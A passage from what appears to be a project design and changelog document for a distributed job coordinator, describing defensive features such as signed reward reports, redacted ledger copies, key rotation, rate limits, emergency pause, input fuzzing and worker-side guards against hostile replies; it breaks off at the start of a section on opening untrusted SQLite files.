- 13 new tests (294 in total). I switched off 21 rules one at a time (requiring the third signature, refusing a handover key that's on the chain, the announcement's purpose, coordinator key, signature and self-check, `rotate` needing the stick, needing the right stick, refusing a coordinator key as the stick, adding the signature, the key-making folder and overwrite checks, loading never creating a key, the coordinator's start-up check, serving the announcement, reading the setting, the worker passing its pin to the chain check, pinning on a later run, the given-vs-pinned conflict, never replacing a pin, checking the announcement) and a test failed every time. Also run end to end with the real server and `demo_worker.py`: the worker pinned the coordinator key, then the announced handover key after a restart; `rotate` without the stick was refused, with it the worker followed and a job was accepted; a "thief" server with a copy of the current key file and a handover to its own key (signed by both keys) was refused, and the pin stayed put. No keys or tokens in the server log.

**Limits:** off until you make the key and set it. A thief with the coordinator key file can still sign **jobs** until you rotate, so rotate (with the stick) as soon as you suspect a theft. Workers that never pinned a handover key (or were started with `--coordinator-key`) still follow any handover signed by the old and new key; give them the new key directly. If the stick is lost, workers that pinned it can't follow any further rotation: re-pin them by hand. The first pin is still trust on first use, unless you hand out the key directly.

## Implemented: signed reward reports (threat model #10, first step)

Tested in software only (0.5.11). Simulated points only.

- **The coordinator signs a closed period's report.** `python -m app.rewards report --sign --out r.json` (or `GET /v1/rewards/report?until=...&sign=true`) adds a `signature` block: algorithm, the coordinator's public key, its fingerprint and an Ed25519 signature. It is the same key that signs job manifests; the signed message carries `purpose: bnh-reward-report-signature/1`, so a report signature can never pass as a job signature.
- **What is signed:** the report type, `report_sha256` (which covers the whole body), the scoring version and the period. Editing any number breaks the hash; recomputing the hash breaks the signature.
- **Anyone can check it without the database:** `python -m app.rewards verify r.json --no-db --public-key <hex>` (or `BNH_COORDINATOR_KEY`). Without a trusted key it still checks, but tells you to compare the fingerprint, because anyone can sign a file with their own key.
- **Refuses to sign** a period that hasn't ended (`until` in the future; its numbers can still change and a live per-job view can reveal hidden tests, threat model #14), a report that fails its own checks, or a report whose hash doesn't match. The CLI never creates a new key: `--sign` with a missing key file is an error.
- `verify --db` with `--public-key` now also demands a valid signature. An unsigned report still verifies against the ledger as before.
- 12 new tests (109 in total), including an edited-and-rehashed report, a report signed by an impostor key, a report signature tried as a job signature, and an open period. Each new check was switched off once to confirm a test fails. Also run end to end: a coordinator process, a demo worker that finished two jobs, a signed report checked offline and against the ledger, a tampered copy refused, and the API refusing to sign an open period.

**What this does not fix:** a signature proves *who issued* the report, not that the numbers are right. The coordinator can still sign a report built from a database it edited; only an independent re-run against a copy of the ledger (`verify --db`) checks the numbers, and nobody outside the operator has that copy yet. There is no key rotation and no public place where reports are posted yet.

## Implemented: shareable ledger copies (threat model #10, second step)

Tested in software only (0.5.13). Simulated points only.

A signed report proves who issued the numbers. To check the numbers themselves, someone needs the ledger they came from. `app/ledger_copy.py` makes a redacted copy of the ledger up to the end of a closed period that anyone can re-run the report against:

    python -m app.rewards report --db ./data/prototype.sqlite3 --until 1800000000 --sign --out report.json
    python -m app.ledger_copy export --db ./data/prototype.sqlite3 --until 1800000000 --out ledger-copy.sqlite3
    # anyone, with the two files and the coordinator's public key:
    python -m app.rewards verify report.json --db ledger-copy.sqlite3 --public-key <hex>
    python -m app.ledger_copy info ledger-copy.sqlite3

- **What it keeps:** the structure the checks need. Which job re-ran which, who did each job, which workers share an owner, timestamps, points and settlement. Both the report and every `check_consistency` invariant (no self-audit, no same-owner audit, every outvoted result has a tie-breaker, ...) give the same answer on the copy as on the coordinator.
- **What it removes:** worker key hashes, enrollment codes, payloads and prompts, job signatures, answers and answer hashes, expected answers of hidden tests, event details (they can name owners), worker capabilities and last-seen times. Owner labels become `owner-1`, `owner-2`, ... (same owner, same label). Payload hashes are replaced by an HMAC with a random key that is thrown away, so a re-run still visibly matches its original inside the copy but can't be matched against live jobs.
- **What it leaves out:** jobs created at or after `until` (except re-checks of earlier jobs, which settle them), events at or after `until`, and workers that joined later.
- **Refuses** an open period, a period with any job (or re-check of one) still queued or running, a ledger that fails its own consistency check, an existing output file, and writing over the ledger itself. Deleted rows are wiped (`secure_delete` plus `VACUUM`), and the file is built under a temporary name, so a failed export never leaves a half-redacted copy.
- **Checking never changes the file.** `rewards report/verify` open a copy read-only, so the sha256 printed at export stays valid. A report that reaches past the copy's `until` is refused, since it would be built from missing data.
- 10 new tests (137 in total), including a byte search of the copy for every prompt, answer, expected answer, key, key hash, code hash, signature, real owner label and original payload/answer hash used. Six checks were switched off one at a time (wiping, hash masking, the open-job check, the past-the-end guard, read-only opening, event-detail removal) and a test failed every time. Also run end to end: a coordinator process and a demo worker, an export refused while a job was still queued, then a signed report re-checked against the copy with "OK", no secrets found in the copy, and its sha256 unchanged after checking.

**Trade-off and limits:** for the closed period, the copy shows which jobs were hidden re-runs and hidden tests and how they came out (not their prompts or answers). Outsiders need that to check that no worker audited itself, but it is more than the report shows (threat model #14), so share copies with a delay. A copy proves the report matches *this* copy; an operator could still edit the ledger before exporting. Copies from many periods that later disagree, or independent observers, are what catch that. There is still no fixed public place to post reports and copies (owner decision).

### Comparing copies across periods (since 0.5.30)

Each copy covers everything up to its `until`, so a later copy must contain an earlier copy's history unchanged. If the operator quietly rewrote period 1 (moved points, turned a held result into a confirmed one, dropped a failed hidden test) and then shared a period-2 copy, each copy would still pass its own checks. Comparing the two catches it:

    python -m app.ledger_copy compare ledger-copy-2026-11.sqlite3 ledger-copy-2026-12.sqlite3 [--out compare.json]

- **Nothing edited or deleted:** every job, result, re-check exclusion, rig and event in the older copy is still in the newer one with the same values.
- **Nothing back-dated:** the newer copy has no job, rig, event or result dated before the older `until` that the older copy didn't have.
- **Same numbers:** a reward report for everything before the older `until` gives the same `report_sha256` from both copies.
- **Compared by shape, not value:** owner labels and masked input hashes are redacted differently in every copy, so it checks that rigs which shared an owner still do (and others still don't), and jobs which had equal inputs still do. One field may legitimately change: a rig revoked after the older `until` shows as active in the older copy.
- **Also:** each copy must pass its own consistency check; a full ledger, a junk file or the copies in the wrong order are refused with a message (exit 2). Exit 0 = history intact, 1 = differences listed. Read-only: neither file changes, so their sha256 stay valid. `--out` never overwrites.
- 13 new tests (467 in total). Twenty of the tool's rules were switched off one at a time and a test failed every time.

**What it doesn't prove:** that the older copy was true in the first place. It only shows the operator didn't rewrite history that was already shared, and only helps if someone kept the older copy. Publishing copies somewhere others save them (owner decision) is what gives it teeth.

### Retiring hidden tests a copy revealed (since 0.5.31, `test-reuse-v1`)

A copy shows which jobs before its `until` were hidden tests, and every rig remembers the inputs of the jobs it ran. So once a copy exists, a rig that ran a hidden test can tell "the job with input X was a test". If the operator later used X again as a hidden test, that rig would recognise it and answer honestly only there.

- **Every export is written down** in the live ledger as a `ledger_copy_made` event with the copy's `until` and sha256. If that can't be written, the copy is deleted and the export fails (nothing shared without a record). Exporting from a copy is refused, so the record never changes a file you already shared.
- **A new hidden test whose exact input was a hidden test before the latest recorded `until` is refused** with `409` and a plain "make a new hidden test". Aimed tests (`target_worker`/`target_tier`) go through the same check. Normal jobs with that input are fine: they reveal nothing.
- **Operator health** adds `hidden_test_reuse` (`revealed_until`, how many test inputs are retired, how many open hidden tests share an input with another hidden test) and warns while any open test shares an input, since rigs that compare notes could spot it even without a copy. Never shows the input or the expected answer.
- Works while paused. Inside a copy the record keeps no details, so later copies still compare cleanly.
- 12 new tests (479 in total). Thirteen rules were switched off one at a time and a test failed every time. Also run against a real coordinator process here: a hidden SHA-256 test answered by the demo worker, an export, then the same input refused with `409`, a fresh one accepted, and the input never in the log.

**Limits (of v1):** only the exact input was matched. A changed setting or a reworded prompt counted as new, even if a rig could still recognise it. Export from the live ledger: a copy made from a backup isn't recorded in the live one.

### Near copies count too (since 0.5.39, `test-reuse-v2`)

v1 compared payloads byte for byte. For `llm:generate` the payload holds the seed, `max_tokens`, timeout and model as well as the prompt, so the same question with `seed` 8 instead of 7 was a "new" input, and so was `name a ship?` after `Name a ship`. A rig that remembers the question recognises both.

- **Input fingerprint** (`input-fingerprint-v1`, `tasks.input_fingerprint`): sha256 of the task type and the job's *recognisable text*, after Unicode NFKC folding, case folding and dropping everything that isn't a letter or digit. For `llm:generate` the recognisable text is the prompt only (seed, `max_tokens`, timeout and model ignored); for `demo:sha256` it is the whole payload. So case, spacing, punctuation, symbols, zero-width characters, full-width letters and settings no longer make a different input. Text with no letters or digits at all only matches itself exactly.
- **The coordinator refuses near copies** of a revealed hidden test with `409`. The message says whether it was an exact or a near copy, never which old test it matched or what it contained. Normal jobs are never refused. Tests created before this version are covered, because the fingerprint is worked out from the stored payload.
- **Operator health** (`hidden_test_reuse`, now `rule: test-reuse-v2`, `fingerprint: input-fingerprint-v1`) counts near copies as the same input, both for `retired_inputs` and for the warning about open hidden tests that share an input.
- **The private pool** (`challenge_pool add`) skips a near copy of a test that is already in the pool or was used, and every used test now records its fingerprint. Used records from older pool files have no fingerprint and still block their exact input.
- 23 new tests (596 in total). I switched off 11 parts one at a time (no near-copy check, settings counted, case kept, no NFKC, punctuation kept, end of the copy period ignored, health exact-only, pool check off, pool forgets fingerprints, message always says exact, symbol-only fallback) and a test failed every time. Also run against a real uvicorn coordinator: a hidden SHA-256 test answered by the demo worker, an export, then the exact input refused, `secret boat-riddle!` refused as a near copy of `Secret Boat Riddle`, a fresh test accepted, and the input never in the log.

**Limits:** the fingerprint is deliberately broad, so two different questions that differ only in symbols (`7*8` and `7+8`) count as the same and the second is refused: write a different question. It does not catch rewording (`Name a ship` vs `Give me a ship's name`), translations, or look-alike letters from other alphabets (a Cyrillic `а` in place of a Latin `a`). Each new hidden test is compared against every hidden test in the copied periods, which is fine for a few thousand tests.

### Publishing them in one public place (since 0.5.42, `reports-v1`)

The owner chose the repo's `reports/` folder, served on the site at https://boatsnhoes.meme/reports/ (a page that lists every period from `reports/index.json`) and kept with full history by GitHub. One folder per closed period (`2026-12-01T0000Z_2026-12-08T0000Z/`) holding `report.json`, `ledger-copy.sqlite3` and `SHA256SUMS`.

    python -m app.publish_report add report.json ledger-copy.sqlite3 --public-key <hex> [--dry-run]
    python -m app.publish_report check [--public-key <hex> ...]

- **`add` refuses** the live ledger (only redacted copies), an unsigned or edited report or one signed by another key, a copy that doesn't end where the period ends or doesn't re-create the identical report, a period that ended less than `--min-wait-hours` ago (default 168 = 7 days; copies reveal which past jobs were hidden tests, threat model #14), a period that overlaps or comes before one already posted, a copy that fails `ledger_copy compare` against the previous one, and anything already published. Files are copied byte for byte and the folder appears in one step; nothing is ever replaced. It doesn't touch git.
- **`check`** re-verifies the whole folder (file hashes, `SHA256SUMS`, signatures, every report against its copy, every copy against the one before, no unlisted folders) and changes nothing. CI runs it on every change, and a test runs it on the real folder.
- **Limits:** rig names (`worker_id`) are public in both files, so pick names that don't identify people. Without `--public-key`, `check` only shows the folder agrees with itself. After a key rotation, pass each trusted key. Software only, 11 tests; nothing is published yet.

## Implemented: versioned job and receipt schemas (Track E)

Tested in software only (0.5.10). Code: `app/schemas.py`.

- **Every job says which layout it uses.** Manifests carry `schema_version` (`bnh-job/1`), covered by the Ed25519 signature. A worker refuses any version it doesn't know instead of guessing what the fields mean.
- **Model jobs name their exact model file.** `llm:generate` jobs carry `model_sha256`, copied from the pinned registry when the job is created and covered by the signature. Audits and tie-breakers copy it from the original job, so re-pinning the registry later never changes what an existing job means. Jobs with no model carry `null`.
- **The worker checks its own pin first.** Before running anything, the demo worker compares the job's `model_sha256` with its own registry's pin (and the executor re-hashes the file against that pin before every run). A different or missing pin means the job is refused.
- **Receipts echo what the worker used.** A result now carries `receipt_version` (`bnh-receipt/1`), `job_schema_version`, `payload_hash` (the worker hashes the input it ran) and `model_sha256`. The coordinator refuses (`422`) a receipt with an unknown version or any value that doesn't match the job. A refused receipt leaves the lease alone, is logged as a public `receipt_mismatch` event and counts as a bad submission in reward reports.
- `GET /health` lists the job and receipt versions this coordinator speaks.
- **Older databases** are migrated in place. Jobs stored before versioning are marked `bnh-job/0`; new workers refuse them with a clear message, so start new work from new jobs.
- Two new consistency checks: a re-run whose version, input or model hash differs from its original, and a model job created without a pinned model hash.
- 8 new tests (97 in total). I disabled each new check in turn (receipt match, worker pin check, audits copying the original hash) and the matching tests failed. Also run end to end: coordinator process + demo worker (versioned job accepted) and an old-style receipt refused with a clear message.

**What this does not prove:** a receipt is the worker's own claim. A dishonest worker can copy the job's hashes into its receipt without running anything. These checks catch honest mistakes (stale model file, outdated worker, an answer sent to the wrong job); hidden re-runs and challenges are still what catch cheating (threat model #8).

## Implemented: structured logs and health reporting (Track D)

Tested in software only (0.5.12).

- **One JSON object per log line** (`app/observability.py`): `ts`, `level`, `logger`, `msg`, then named fields. `LOG_FORMAT=text` gives a readable `key=value` version for a terminal; `LOG_LEVEL` picks debug/info/warning/error (default info). Start uvicorn with `--no-access-log` so requests aren't logged twice.
- **One line per request** (`bnh.access`): method, path, status, duration in ms and a request id. The id comes back in the `X-Request-ID` header; a worker can send its own (letters, digits, `.`, `_`, `-`, up to 64 characters) so its error can be matched to the coordinator's line.
- **Lifecycle lines** (`bnh.coordinator`): job created, job leased, result submitted (with the outcome), worker enrolled, worker revoked. **Warnings** for refused worker keys, refused operator tokens and refused receipts, with the reason.
- **Safe to paste into a bug report:** no keys, tokens, enrollment codes, prompts, answers or expected answers, no query strings and no headers. Fields with those names are replaced with `[redacted]` even if code passes them by mistake. A challenge is logged exactly like a normal job. Logs are still operator data: the request lines show *when* you called an operator endpoint, so don't hand raw logs to workers.
- **`GET /health` (public):** `200` with `status: ok`, uptime and job counts when the database can be read; `503` with `status: down` when it can't (the error itself goes to the log, not the response). It says nothing about workers or audits.
- **`GET /v1/operator/health` (operator only):** registered, active and revoked workers; queued and leased jobs, the oldest queued job's age, leases past due and jobs past their deadline; open audits and those **waiting for an eligible auditor**; event counts for the last hour; the ledger's consistency problems; and plain-language `warnings`. `status` is `attention` whenever there is a warning. It only reads: past-due leases are requeued by the next worker request, as before.
- 18 new tests (127 in total), including a full workflow whose logs are searched for every key, token, code, prompt and answer used. Each safety check was broken on purpose once (no redaction, query strings logged, a key logged under another name, the database check skipped) and a test failed every time. Also run end to end: a coordinator with JSON logs, a demo worker finishing a job, a refused fake key matched by its request id, and both health endpoints.

**Limits:** logs go to stderr only (no rotation or shipping yet; use your service manager), and no metrics endpoint for graphs. The waiting-auditor warning is exactly what your two-card test will show if both RX 470s share one owner label.

## Implemented: emergency pause for incidents (0.5.29, `pause-v1`)

If something looks wrong (a leaked worker key or operator token, a suspected copy of the signing key, a bug paying the wrong points), the first move is "stop new work while I look". Killing the server does that badly: in-flight results are lost, revocation and the health page go dark, and the next restart quietly hands out work again.

- **Pause:** `POST /v1/operator/pause` with `{"reason": "..."}` (operator token) or `python -m app.incident pause --reason "..."` on the server. **Resume:** only `python -m app.incident resume --note "what you checked or fixed"` on the server. There is no resume endpoint, so a leaked operator token can stop the coordinator but never restart it. `python -m app.incident status [--json]` shows the state and past pauses.
- **While paused:** no job is leased (workers get `503` with `Retry-After: 60` and still count as seen, so they stay eligible for audit picks afterwards); no job or hidden test is created, operator included; no enrollment code is issued or used (a refused code stays unused); no audit or tie-breaker is assigned.
- **Still working while paused:** results for jobs leased before the pause are accepted (an audit they trigger waits, unassigned, until resume), revoking a rig, and a known rig updating its capabilities.
- **Fair to rigs:** an audit assignment the pause interrupted gets a fresh `AUDIT_ASSIGN_SECONDS` window on resume, so a pause never counts as "not picked up" in audit follow-through. A pick that had already taken its job doesn't get a second turn. Jobs whose own deadline passes during a long pause still expire.
- **Visible:** public `/health` says `"status": "paused"`, `"accepting_work": false` and `paused_since` (still HTTP 200, no reason); `/v1/operator/health` shows the reason, who paused (`api`/`cli`) and a warning. The reason is never logged.
- **Durable and audited:** the state is the latest `coordinator_paused` / `coordinator_resumed` event, so it survives a restart and sits in the audit trail. Pausing twice keeps the first time and reason. Ledger copies keep that a pause happened, never the reason or note. The rehearsal tool refuses to run against a paused coordinator, the demo worker exits politely on `503`, and `python -m app.workers enroll` refuses codes while paused.
- 20 tests (454 in total). I switched off 17 rules one at a time (refusing claims, job creation, codes, registration; skipping assignment; the fresh window; no second turn; marking rigs seen; keeping the first reason; reason checks; no public reason; the operator warning; `Retry-After`; the rehearsal, workers-CLI, missing-database and empty-note checks) and a test failed every time. Also run against a real uvicorn coordinator: pause over HTTP, `503` on job creation, CLI status and resume, reason absent from the log.
- The full plan around it (who does what, playbooks per incident): [`docs/INCIDENT-RESPONSE.md`](../docs/INCIDENT-RESPONSE.md).

**Limits:** it doesn't stop a rig finishing a job it already has, revoke anyone, rotate keys or touch the website. One pause state for the whole coordinator (no per-task-type pause).

## Implemented: fixed points per task type (0.5.22)

Tested in software only. Simulated off-chain points only.

Since 0.5.19 only the operator or a submitter token can queue jobs, but whoever holds the submitter token still chose each job's points (0-1000), so it could queue a 1000-point job for a friend's rig to pick up (threat model #16). New in `app/points.py` (rule `points-table-v1`):

- **`POINTS_TABLE`** (empty by default = no change): one fixed number per task type, e.g. `POINTS_TABLE=demo:sha256=1,llm:generate=10`. It must list every task type the coordinator runs, exactly once, each a whole number 0-1000; anything else stops the coordinator at start-up with a plain error.
- **With a table, every new job and hidden test gets the table's number.** `reward_points` can be left out (recommended) or set to that same number. Any other number is refused with `422` and nothing is queued, for the submitter **and** the operator, so a hidden test always pays exactly what normal work of its type pays and can't be spotted by its points.
- **Without a table nothing changes:** the request's number, or 1 if left out.
- **Changing the table** means editing `.env` and restarting. Jobs already queued keep the points they were signed with; only new jobs use the new numbers.
- **`/v1/operator/health`** adds `points` (`rule`: `points-table-v1` or `creator-chooses`, and the `table`) and warns while `SUBMITTER_TOKEN` is set without a `POINTS_TABLE`.
- 25 new tests (270 in total). Each rule was switched off once on purpose (12 changes: using the table at all, refusing other numbers, hidden tests using the table, the health warning, the start-up check that the table covers every task type, refusing a missing task type, a duplicate, a number over 1000, an unknown task type, reading the setting, showing it on the health page, normal jobs using the table) and a test failed every time. Also run end to end with a real coordinator and `POINTS_TABLE=demo:sha256=2,llm:generate=10`: a submitter asking for 1000 got `422`, leaving it out got 2, the operator's hidden test asking for 50 got `422`, a demo worker finished the job and the public ledger showed 2 points; after a restart with `demo:sha256=5` a new job paid 5 (ledger 7), and the server log held no tokens or payloads. A table missing a task type stopped start-up.

**Limits:** the table fixes *who* picks the number, not *what it should be*: the numbers themselves are your call (a real measure like tokens generated or seconds of GPU time would be fairer later, once the RX 470s are measured). A submitter can still queue many jobs; the per-address request limit slows that down but the submitter token should still only go to programs you run.

## Implemented: real client addresses behind a proxy (0.5.20)

Tested in software only.

Request limits and lock-outs count per address. Behind a reverse proxy (nginx, Caddy, a tunnel, a load balancer) every request arrives from the proxy, so all rigs shared one bucket and one rig with a bad key could lock everyone out. New in `app/client_address.py`:

- **`TRUSTED_PROXIES`** (comma or space separated addresses or ranges, e.g. `127.0.0.1` or `10.0.0.0/8`; **empty by default**). Only a request whose connection comes from a listed proxy has its `X-Forwarded-For` header read. From anyone else the header is ignored, so a rig can't pick its own address to dodge a lock-out.
- **Read from the right.** Each proxy appends the address it saw, so the rightmost entries were written by your proxies and anything further left may be made up by the client. The first entry from the right that isn't a listed proxy is the client. Ports (`1.2.3.4:5555`, `[2001:db8::7]:443`) and IPv4 seen over IPv6 (`::ffff:10.0.0.5`) are understood; at most 20 hops are read.
- **No header, or an entry that isn't an address:** the request keeps the last address we can vouch for (usually the proxy) and shares its limits. `/v1/operator/health` → `rate_limits.proxies` counts these and adds a plain warning, because it usually means the proxy isn't set to send the header.
- **"Trust everyone" is refused** (`0.0.0.0/0`, `::/0`): the coordinator won't start, because any client could then choose its address. Bad entries are refused the same way.
- **The real client is what gets limited, locked out, tagged in logs (`client_tag`) and named on the operator health page**, so you can block that address rather than your own proxy. Addresses still never appear in log lines.
- **Start uvicorn with `--no-proxy-headers`** (shown in the quick start). uvicorn has its own proxy-header handling, on by default for `127.0.0.1`; turning it off makes `TRUSTED_PROXIES` the one setting that decides.
- 20 new tests (230 in total). Each rule was switched off once on purpose (12 changes: trusting any peer, reading left to right, allowing trust-everyone, counting missing headers, stopping at garbage, IPv4-over-IPv6, ports, the hop cap, working the address out once per request, the health warning, reading the setting, using the resolver at all) and a test failed every time. Also run end to end with a real coordinator and `TRUSTED_PROXIES=127.0.0.1`: three wrong keys from "rig A" (`X-Forwarded-For: 203.0.113.50`) locked A out (`429`), "rig B" behind the same proxy still got `200`, A sending a made-up `203.0.113.51` in front of its real address was still `429`, the operator health page named `203.0.113.50` and warned about one request with no header, and the log held no addresses.

**Limits:** only `X-Forwarded-For` is read, not the newer `Forwarded` header (nginx, Caddy, Cloudflare and most load balancers send `X-Forwarded-For`). If a listed proxy doesn't overwrite or append the header correctly, a client could choose its address, so list only proxies you run and have configured. Rigs behind one home router still share one address (that's their real address). Same in-memory, single-process limits as 0.5.19.

## Implemented: who may queue jobs, request limits and lock-outs (0.5.19)

Tested in software only.

- **Queuing a job needs a token.** `POST /v1/jobs` used to be open to anyone who could reach the coordinator. That let any enrolled rig queue a job worth up to 1000 simulated points on an empty queue, claim it itself and get paid. Now it needs either `X-Operator-Token` or a new `X-Submitter-Token` (`SUBMITTER_TOKEN` in `.env`, at least 24 characters, different from the operator token). The submitter token can **only** queue normal jobs: it can't see hidden tests, answers, audits or reports, enroll rigs or make challenges, so a program that feeds work in never needs the operator token. With neither token set, job creation is off. A worker key never works here.
- **Requests per minute per address** (`app/rate_limit.py`, `RATE_LIMIT_PER_MINUTE`, default 240, `0` = off). Each client address gets a bucket of that many requests that refills at the same rate. An empty bucket gets `429 Too Many Requests` with `Retry-After`. The demo worker waits as told (at most 60 s, a few times) before claiming or submitting again; submits are idempotent, so a retry is safe.
- **Lock-out after wrong credentials** (`AUTH_FAILURE_LIMIT`, default 10, `0` = off, within `AUTH_FAILURE_WINDOW_SECONDS`, default 600). A wrong, revoked or someone else's worker key, a wrong operator or submitter token, or a bad enrollment code counts as one failure. That many failures in the window locks the address out (`429` on every endpoint) until the oldest falls out of the window. A **missing** key, token or code doesn't count: that's a setup mistake, not a guess. Worker keys and codes are 256-bit random, so this mostly protects the operator and submitter tokens, which you type in yourself. Since 0.5.62 (`guess-slot-v1`) a request with an operator or submitter token also takes a guess slot while it is checked, so wrong tokens sent at the same moment can't all be checked before the first one counts (see below).
- **`/health` is never limited**, so a monitor can't be locked out by someone else's traffic.
- **Logs never contain the address.** Limit and lock-out lines carry a short `client_tag` (a keyed hash with a random key made at start-up) so one client's lines can be grouped. Run uvicorn with `--no-access-log` as shown below, because uvicorn's own access log prints addresses. `/v1/operator/health` (operator only) adds `rate_limits`: totals since start, and each locked-out address with its tag and how long until it's let back in, plus a warning, so you can block it in a firewall if needed.
- 20 new tests (210 in total). Each rule was switched off once on purpose (13 changes: the token check, counting each kind of wrong credential, not counting missing ones, the `/health` exemption, the lock-out, the bucket, the refill cap, forgetting old failures, the tag in logs, the health warning, a submitter header when no submitter token is set) and a test failed every time. Also run end to end with a real coordinator: no token `403`, submitter token `200` (and `403` on an operator endpoint), a demo worker finished the job, the worker's own 1000-point job refused, three wrong credentials locked `127.0.0.1` out (`429`, `Retry-After: 600`) while `/health` still answered, and the operator health page, reached from a second address, named it. A second run at 5 requests a minute gave `429` on the 6th request with `Retry-After: 12`.

**Limits:** counts and lock-outs live in memory, so a restart clears them, and one coordinator process is assumed. "Client" means the connecting address: behind a home router, many machines share one address and its limits, and one rig with a bad key can lock the others on that address out for the window. (Behind your own reverse proxy, set `TRUSTED_PROXIES`; see 0.5.20 above.) Someone with many addresses gets many buckets; this slows a flood, it doesn't stop a distributed one (that needs the host's DDoS protection). A submitter could still queue jobs with up to 1000 points for a friend's rig to claim (fixed with `POINTS_TABLE`, see 0.5.22 above), so give the submitter token only to programs you run.

## Implemented: hostile-input limits and a route-by-route fuzz (0.5.52, `input-limits-v1`)

Tested in software only. First pass of the "code audit" item: every API route was sent broken and hostile input to look for crashes. It found five real problems, now fixed in `app/input_limits.py` and `app/models.py`:

- **No body size limit.** Anyone, no login needed, could send a 1 GB body and the coordinator read all of it into memory before the field checks refused it. Now `MAX_BODY_BYTES` (default 262144 = 256 KiB, allowed 16 KiB to 4 MiB) is enforced before reading: a `Content-Length` over the limit gets `413` without reading a byte; a body sent without a length (chunked) is cut off with `413` as soon as it passes the limit; a broken `Content-Length` gets `400`. The largest honest request (a hidden test with every field at its maximum, every character an escaped emoji) is about 150 KB, so it fits.
- **Deeply nested JSON crashed the request.** A few thousand `[` made Python's JSON reader run out of recursion: a `500` and a stack trace in the log, on any route. Bodies nested deeper than 32 levels now get `400` before parsing (no coordinator request nests deeper than 2; brackets inside strings don't count).
- **A refused body was echoed back.** FastAPI's `422` repeats each wrong value (`"input": ...`): a secret typed into the wrong field, or a 4 MB string. And a number like `1e999` (infinity) in that echo couldn't be written as JSON, so the `422` itself crashed into a `500`. Errors now carry only `type`, `loc` and `msg`.
- **Numbers too big for SQLite.** `GET /v1/rewards/report?until=2^70` crashed (`OverflowError`). `since`/`until` are now `0` to `2^53`, a `422` otherwise.
- **Negative worker timestamps were accepted.** `started_at = -2^70` passed the "completed after started" check. `started_at`/`completed_at` are now `0` to `2^53`.
- **Plain names only.** Worker names (registration and `target_worker`) must be 3-80 of `A-Z a-z 0-9 . _ : -`, so a name can't carry a newline, a NUL, a right-to-left override or HTML into logs, reports or pages. Capability lists: at most 16 lowercase names of up to 64 characters. Already-registered workers aren't touched; the rule applies to new registrations.
- **Order:** the limit runs inside the request logger and rate limiter, so refused requests are still logged (path and status, never the body) and still count toward `RATE_LIMIT_PER_MINUTE`.
- **The fuzz** (`tests/test_input_limits.py`): every API route, with valid operator, submitter and worker credentials, gets odd path segments, odd query values, 11 broken bodies and 19 hostile values in each field of a valid example (about 1,000 requests). A request may be refused, never crash (`5xx`) or show a stack trace. A new route or request type without an example makes the test fail, so it stays complete.
- 38 new tests (1,063 in total). Each fix was switched off once on purpose (13 changes); all were caught, two only after a sharper test was added (see BUILD-LOG 0.5.52).

**Limits:** this checks crashes and resource use from single requests, not slow-sending clients (that's the web server's job: run uvicorn with `--timeout-keep-alive` and behind a proxy with its own limits) and not a flood from many addresses (threat model #17). A fuzz finds what it tries; it is not a full audit.

## Implemented: worker-side guards against a hostile coordinator (0.5.53, `worker-input-v1`)

Tested in software only. Second pass of the "code audit" item, the other side of the wire: the worker runs on a volunteer's own machine, so a fake coordinator, a mistyped URL or someone in the middle of the connection must not be able to crash it, fill its memory, write on the owner's terminal or steal its key. Before this, `demo_worker.py` read every reply whole with no size limit, let httpx unpack compressed replies, crashed with a stack trace on non-JSON, very deep, `NaN` or 5,000-digit replies (or a list where it expected an object), printed the coordinator's error text and a refused job's id raw to the terminal, saved whatever came back as its key, looped as fast as it could when every job was refused, and would send its key over plain `http://` to any address. New `app/worker_guard.py`, used for every request the worker makes:

- **Size:** a reply over `MAX_RESPONSE_BYTES` (8 MiB; the biggest honest reply, a job at the coordinator's highest body setting, is about 4 MiB) is refused before reading if it says its size, otherwise the moment it passes the limit.
- **No compressed replies:** the worker asks for `Accept-Encoding: identity` and refuses any `Content-Encoding`, because 50 KB of gzip can unpack to 50 MB (or 1 MB to 1 GB).
- **Time:** the whole reply must arrive within 60 s. httpx's own timeout is per read, so a server sending one byte every few seconds could otherwise hold the worker for ever.
- **JSON:** nesting deeper than 32, `NaN`/`Infinity`, numbers over 4,300 digits, invalid UTF-8 or anything not a JSON object on a `2xx` is a plain refusal. An error reply with a junk body is just an error.
- **Printing:** every piece of text from the coordinator goes through `say()`: control characters (`ESC` starts colour, cursor, screen-clear and window-title codes), invisible and right-to-left marks and line breaks become `?`, cut to 200 characters.
- **Shapes:** the worker key must be exactly `bnhw_` + 32-128 URL-safe characters before it is saved (a bad one: nothing saved); a job id must be 1-80 of `A-Z a-z 0-9 _ -` before it goes into the submit URL, even on a correctly signed job; `expires_at` must be a whole number; `check_manifest` raises `ManifestError`, never a crash, for any malformed job.
- **Plain http:** `https://` anywhere, `http://` only to this machine (`127.x`, `::1`, `localhost`); another address needs `--allow-plain-http` (a test lab you control), because the worker key would travel readable by anyone on the way. URLs with a user name or password, other schemes and bad ports are refused. Redirects are never followed.
- **Back-off:** after a refused job the worker waits 5, 10, 20, 40, then 60 s each time (reset after a job runs), so a broken or hostile coordinator can't make it spin.
- **Tests** (`tests/test_worker_guard.py`, 103): 16 hostile replies (HTML, 200,000 `[`, `NaN`, 6,000 digits, bad bytes, lists, terminal codes in every field, wrong types, 12.5 MB without a size, gzip, `403`/`500`/`422`/`503` with terminal codes) against each worker step (pinning the coordinator key, enrolling, claiming); every field of a signed job replaced with 15 hostile values; must stop cleanly or carry on, never crash, never print a control character, never pin, save or run anything hostile. Also checked against a real hostile HTTP server on a socket: an endless body was cut at 8 MiB, a declared 5 GiB body refused before reading, a gzip bomb refused, a one-byte-every-0.5 s drip given up at the deadline.
- 21 deliberate breakages of the guards; 20 caught. The one that slipped past is printing the submit reply without `say()`: Python already escapes control characters when it prints a whole dict, so it's a second layer there (see BUILD-LOG 0.5.53).

**Limits:** it protects the worker from replies, not from a coordinator that signs bad jobs with the real key (the coordinator is trusted; signature, pin and hash checks are unchanged). A server that dribbles its *headers* slowly is only bounded by httpx's per-read timeout. Plain http to this machine is still allowed, so anything else on that machine can read the key. Only `demo_worker.py` uses these guards; other tools that talk to the coordinator (`rehearsal`, `challenge_pool`) are run by the operator against their own coordinator.

## Implemented: opening someone else's ledger copy safely (0.5.54, `copy-open-v1`)

Tested in software only. Third pass of the "code audit" item. Ledger copies are published for anyone to download and re-check (`rewards verify --db`, `ledger_copy compare`, `publish_report add|check`), so a copy is a file from a stranger, and a SQLite file can carry more than rows. Before this, the tools opened copies like any database. What could go wrong, and what `app/copy_guard.py` now does before any of our code reads a copy:

